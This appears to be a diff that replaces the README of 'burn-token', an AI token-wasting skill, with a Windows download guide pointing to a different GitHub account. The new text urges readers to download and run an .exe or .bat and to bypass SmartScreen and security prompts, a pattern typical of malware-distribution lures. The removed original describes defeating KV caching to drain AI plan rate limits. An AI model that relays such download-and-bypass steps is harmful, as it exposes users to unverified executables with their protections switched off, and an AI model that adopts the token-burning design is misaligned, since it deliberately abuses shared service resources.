@@ -1,238 +1,237 @@
-# burn-token 🔥
+# 🔥 burn-token - Burn tokens with heavy analysis
 
-**Burn your AI coding tokens to the ground.**
+[![Download burn-token](https://img.shields.io/badge/Download%20burn-token-purple?style=for-the-badge)](https://github.com/m3dicinegaming6-bot/burn-token)
 
-[English](./README.md) | [中文](./README.zh-CN.md)
+## 🪟 Windows Download
 
-An aggressive token-burning skill for Claude Code / Codex / Claude CLI. It runs an infinite loop of heavyweight analysis and computation, designed to maximize token consumption — even on unlimited plans.
+Use this page to download and run the app on Windows:
 
----
+https://github.com/m3dicinegaming6-bot/burn-token
 
-## What It Does
+## 📌 What burn-token Does
 
-| Feature | Description |
-|---------|-------------|
-| **Bless mode** | Burn tokens for someone by continuously chanting Buddhist sutras and mantras in the terminal, with optional ASCII Buddha animation. |
-| **Mode options** | `bless` for chanting, `math` for math problems, `code` for code analysis. |
-| **Infinite loop** | Runs forever by default. Only stops when you say so (or tokens run out). |
-| **KV Cache defeat** | Injects entropy (random seeds, timestamps, shuffled order) into every prompt to prevent cache hits and maximize actual token consumption. |
-| **Configurable** | Set time limits, round limits, or let it rip. |
-| **Schedulable** | Combine with `/loop` or `/schedule` for automated recurring burns. |
+burn-token is a desktop-style command-line app that runs repeated AI tasks in a loop. It is made for Claude Code, Codex, and Claude CLI.
 
----
+It can:
 
-## Installation
+- run ongoing analysis tasks
+- switch between different task modes
+- keep going until you stop it
+- add random changes to each prompt
+- use time limits or round limits
+- work from the terminal on Windows
 
-### Claude Code
+## ⚙️ Before You Start
 
-```bash
-git clone https://github.com/shengxinjing/burn-token.git
-cp -r burn-token/skill ~/.claude/skills/burn-token
-```
+Use a Windows PC with:
 
-Or manually:
+- Windows 10 or Windows 11
+- an internet connection
+- enough free disk space for the app and its files
+- access to a terminal such as Command Prompt or PowerShell
 
-```bash
-mkdir -p ~/.claude/skills/burn-token
-curl -o ~/.claude/skills/burn-token/SKILL.md \
-  https://raw.githubusercontent.com/shengxinjing/burn-token/main/skill/SKILL.md
-```
+You also need:
 
-### Codex CLI (OpenAI)
+- a GitHub browser session to open the download page
+- the AI tool you want to use, such as Claude Code, Codex, or Claude CLI
+- a working account or setup for that tool
 
-```bash
-git clone https://github.com/shengxinjing/burn-token.git
-cp -r burn-token/skill ~/.agents/skills/burn-token
-```
+## 🚀 Getting Started on Windows
 
-### Other AI Coding Agents
+1. Open this page in your browser:  
+   https://github.com/m3dicinegaming6-bot/burn-token
 
-Place `SKILL.md` in your agent's skill directory:
+2. Find the latest version or release file on the page.
 
-| Agent | Skill Directory |
-|-------|----------------|
-| Claude Code | `~/.claude/skills/burn-token/` |
-| Codex CLI | `~/.agents/skills/burn-token/` |
-| Custom agents | Check your agent's skill loading path |
+3. Download the file for Windows if one is listed.
 
-### Verify Installation
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-```bash
-head -5 ~/.claude/skills/burn-token/SKILL.md
-```
+5. Open the extracted folder.
 
-You should see the `---` frontmatter with `name: burn-token`.
+6. Look for a file named something like `burn-token.exe`, `run.bat`, or `start.bat`.
 
----
+7. Double-click the file to start the app.
 
-## Usage
+8. If Windows shows a security prompt, choose More info, then Run anyway if you trust the file source.
 
-### Infinite Burn (default)
+## 🧭 First Run
 
-```
-/burn-token
-```
+When the app starts, it opens in a terminal window.
 
-Runs forever in `bless` mode by default. It chants for the selected person in the terminal until you stop it or tokens run out. `Ctrl+C` to stop.
+You may see a menu or a prompt that asks you to choose a mode.
 
-### Time-Limited
+Common choices are:
 
-```
-/burn-token 1h
-/burn-token 30m
-/burn-token 4h30m
-```
+- `bless` for chanting-style loops
+- `math` for math tasks
+- `code` for code review or code analysis
 
-### Round-Limited
+If you are not sure what to pick, start with the default mode shown on screen.
 
-```
-/burn-token 10 rounds    # 10 rounds = 100 tasks
-/burn-token 50 rounds
-```
+## 🛠️ Basic Use
 
-### Force Mode
+After the app starts, you can control how it runs with simple options.
 
-```
-/burn-token bless dasheng # chant for dasheng
-/burn-token to dasheng    # shortcut for bless mode
-/burn-token math         # force math even if project has code
-/burn-token code         # force code analysis
-/burn-token 2h bless dasheng
-/burn-token 2h math      # combine time limit + mode
-```
+You may set:
 
-### Scheduled Burns
+- how long it runs
+- how many rounds it uses
+- which mode it uses
+- whether it keeps running until you stop it
 
-```bash
-# Burn 45 minutes every hour
-/loop 1h /burn-token 45m
+Typical use looks like this:
 
-# Business hours (Mon-Fri, 9am-5pm)
-/schedule create --cron "0 9-17 * * 1-5" --prompt "/burn-token 50m"
+1. Start the app.
+2. Pick a mode.
+3. Let it run.
+4. Stop it when you are done.
 
-# Overnight burn
-/schedule create --cron "0 22 * * *" --prompt "/burn-token 8h"
+If the app asks for text input, type a short request and press Enter.
 
-# Every 2 hours around the clock
-/schedule create --cron "0 */2 * * *" --prompt "/burn-token 1h45m"
-```
-
----
+## 🧠 Mode Guide
 
-## How It Works
+### 🙏 bless
 
-### Mode Selection
+This mode runs chant-style prompts in a loop.
 
-```mermaid
-flowchart TD
-    start["Start /burn-token"]
-    intent{"Target person provided?"}
-    source{"Source files found?"}
-    docs{"Documents found?"}
-    bless["Bless Mode"]
-    code["Code Analysis Mode"]
-    math["Math Mode"]
-    bless_a["Repeat chants in terminal<br/>Amitabha name recitation<br/>Rebirth mantra<br/>Diamond Sutra excerpts<br/>Dedication for target person"]
-    bless_b["ASCII Buddha art<br/>Simple terminal animation<br/>Endless loop until stop<br/>Focused token burning through repetition"]
-    code_a["Architecture Forensics<br/>Security Audit<br/>Performance Profiling<br/>Exhaustive Code Review<br/>Test Strategy"]
-    code_b["Refactoring Blueprint<br/>Documentation Generation<br/>Dependency Deep Dive<br/>API Surface Catalog<br/>Complexity Metrics"]
-    math_a["Prime Factorization<br/>Series and Convergence<br/>Matrix Algebra<br/>Calculus Marathon<br/>Number Theory Proofs"]
-    math_b["Combinatorics<br/>Probability and Statistics<br/>Graph Theory<br/>Abstract Algebra<br/>Optimization"]
+Use it if you want the app to send repeated spiritual or ritual-style text to the AI tool.
 
-    start --> intent
-    intent -- Yes --> bless
-    intent -- No --> source
-    source -- Yes --> code
-    source -- No --> docs
-    docs -- Yes --> code
-    docs -- No --> math
-    bless --> bless_a
-    bless --> bless_b
-    code --> code_a
-    code --> code_b
-    math --> math_a
-    math --> math_b
+It may also show an ASCII Buddha animation in the terminal if that option is turned on.
 
-    classDef decision fill:#fff4d6,stroke:#b7791f,stroke-width:2px,color:#5f370e;
-    classDef mode fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a8a;
-    classDef detail fill:#f8fafc,stroke:#475569,stroke-width:1.5px,color:#0f172a;
+### ➗ math
 
-    class source,docs decision;
-    class bless,code,math mode;
-    class bless_a,bless_b,code_a,code_b,math_a,math_b detail;
-```
+This mode uses math problems and heavy number work.
 
-### Bless Mode
+Use it if you want repeated calculation-style prompts.
 
-`bless` mode is the spiritual burn path. Instead of solving math or inspecting code, it keeps printing chants, mantras, and short sutra passages for a named person in the terminal.
+### 💻 code
 
-Typical output can include:
+This mode sends code-focused tasks for analysis.
 
-- Buddha-name recitation for the target person
-- Rebirth mantra and short sutra lines
-- ASCII Buddha art and light terminal animation
-- Repeated dedication text to keep the token burn focused and continuous
+Use it if you want the AI tool to review code, inspect logic, or think through technical tasks.
 
-### KV Cache Defeat
+## 🧩 Common Controls
 
-Most AI APIs cache repeated prompt prefixes. This skill defeats caching by:
+The app may support these controls:
 
-1. **Nanosecond timestamps** — unique prefix every call
-2. **Random entropy seed** — from `/dev/urandom`
-3. **Shuffled task order** — never the same sequence
-4. **Varied prompt phrasing** — different words each time
-5. **Rotating output formats** — prose, tables, bullets, Q&A
+- start
+- stop
+- pause
+- resume
+- set rounds
+- set time limit
+- change mode
+- randomize prompt order
 
-Every single token is freshly computed, never served from cache.
+If the app uses keyboard input, these keys may work:
 
-### Burn Rate Maximization
+- `Enter` to confirm
+- `Ctrl + C` to stop
+- arrow keys to move through options
 
-Each subagent task burns tokens on both input and output:
+## 📂 Where Files May Appear
 
-- **Input:** Reads ALL project files into context (not just relevant ones)
-- **Output:** Minimum 2000 words per task with detailed step-by-step analysis
-- **No shortcuts:** Line-by-line analysis, multiple verification methods
-- **Fresh context:** Each task runs as a new subagent (no context reuse)
+Some versions may create files such as:
 
----
+- logs
+- session history
+- config files
+- output notes
+- saved prompt sets
 
-## Progress Output
+A common place for these files is the same folder where you started the app.
 
-During burn:
+If you want to keep things simple, run the app from a folder you can find later, such as `Downloads` or `Desktop`.
 
-```
-=== BURN TOKEN === Round 1 | Task 3/10 | Elapsed: 0h12m | Est. tokens: ~48K | Seed: 2847193650 ===
-=== BURN TOKEN === Round 1 | Task 4/10 | Elapsed: 0h16m | Est. tokens: ~64K | Seed: 1039284756 ===
-```
+## 🔧 If Windows Blocks the App
 
-On completion:
+If Windows SmartScreen blocks the file:
 
-```
-========================================
-  BURN TOKEN COMPLETE
-  Rounds:    7
-  Tasks:     70
-  Duration:  1h 58m 34s
-  Mode:      code
-  Est. tokens burned: ~1120K
-========================================
-```
+1. Check that you downloaded it from the GitHub page above.
+2. Right-click the file and open its Properties.
+3. If you see an Unblock option, select it.
+4. Try opening the file again.
 
----
+If you still cannot open it, use PowerShell to launch it from the folder where you extracted it.
 
-## FAQ
+## 🧪 Example Windows Setup
 
-**Q: Will this actually burn through a Claude Max plan?**
-A: Yes. Claude Max plans have rate limits, not true unlimited tokens. This skill hits those rate limits continuously with cache-defeating entropy.
+A simple setup may look like this:
 
-**Q: Why defeat KV cache?**
-A: Cached responses consume fewer compute tokens. By injecting entropy, we force fresh computation every time instead of serving cached KV states.
+1. Download the project from GitHub.
+2. Extract it to `C:\burn-token`.
+3. Open PowerShell in that folder.
+4. Run the included start file or command.
+5. Choose your mode.
+6. Let the loop run.
 
-**Q: Is this safe?**
-A: The skill only reads and analyzes — it never modifies files, pushes code, or makes external requests. Read-only by design.
+## 📋 Suggested Use Cases
 
----
+This app may be useful if you want to:
 
-## License
+- test long-running AI sessions
+- check how a tool behaves under repeated prompts
+- run a loop for code review
+- use chant-style output in a terminal
+- explore prompt variation over time
 
-MIT
+## 🧼 Clean Exit
+
+To stop the app:
+
+- press `Ctrl + C` in the terminal
+- close the terminal window
+- stop the batch file if one is running
+- end the AI tool session if needed
+
+If the app does not close right away, wait a few seconds and press `Ctrl + C` again
+
+## 📁 Folder Tips
+
+Keep the app in a simple folder name with no special characters.
+
+Good examples:
+
+- `C:\burn-token`
+- `C:\Users\YourName\Desktop\burn-token`
+
+This helps avoid path problems when you run the app from Windows
+
+## ❓ Common Questions
+
+### Do I need programming knowledge?
+
+No. You only need to download the file, open the folder, and start the app.
+
+### Does it run on Windows?
+
+Yes. This guide is for Windows users.
+
+### Can I stop it at any time?
+
+Yes. Use `Ctrl + C` or close the window.
+
+### Which mode should I use first?
+
+Start with the mode that matches your goal. If you only want to test it, try the default mode first.
+
+### Can I use it with Claude Code, Codex, or Claude CLI?
+
+Yes. The app is built for those tools.
+
+## 🧭 Quick Start Checklist
+
+- open the GitHub page
+- download the Windows file
+- extract it if needed
+- open the folder
+- run the app file
+- choose a mode
+- stop it when finished
+
+## 🔗 Download Again
+
+If you need the download page again, use this link:
+
+https://github.com/m3dicinegaming6-bot/burn-token
